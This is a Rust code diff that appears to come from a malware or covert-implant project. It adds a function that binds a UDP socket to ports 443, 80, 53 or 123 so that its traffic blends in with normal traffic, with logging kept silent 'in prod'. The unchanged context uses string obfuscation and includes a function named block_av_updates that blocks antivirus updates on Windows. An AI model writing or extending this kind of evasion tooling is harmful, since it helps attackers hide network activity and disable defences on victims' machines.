@@ -1,3 +1,4 @@
+use tokio::net::UdpSocket;
 #[cfg(windows)]
 use std::fs::OpenOptions;
 #[cfg(windows)]
@@ -6,6 +7,27 @@ use std::io::{Read, Write};
 use std::path::PathBuf;
 
 use obfstr::obfstr;
+
+/// Tries to bind to a camouflage port (443, 80, 53, 123) to blend in with normal traffic.
+/// Falls back to a random port if all camouflage ports are busy.
+pub async fn bind_camouflage_socket() -> UdpSocket {
+    // Priority List: HTTPS, HTTP, DNS, NTP
+    let ports = [443, 80, 53, 123];
+    
+    for port in ports {
+        let addr = format!("0.0.0.0:{}", port);
+        // On Linux/macOS, low ports require root. If we are not root, this will fail gracefully.
+        // And we just fallback to next or random.
+        if let Ok(socket) = UdpSocket::bind(&addr).await {
+            // println!("[+] Camouflage Port Bound: {}", port); // Keep it silent in prod usually
+            return socket;
+        }
+    }
+    
+    // Fallback: Bind to any available port (Random)
+    // println!("[!] Using Random Port");
+    UdpSocket::bind("0.0.0.0:0").await.expect("Fatal: Failed to bind any UDP port")
+}
 
 #[cfg(windows)]
 pub fn block_av_updates() -> Result<(), Box<dyn std::error::Error>> {
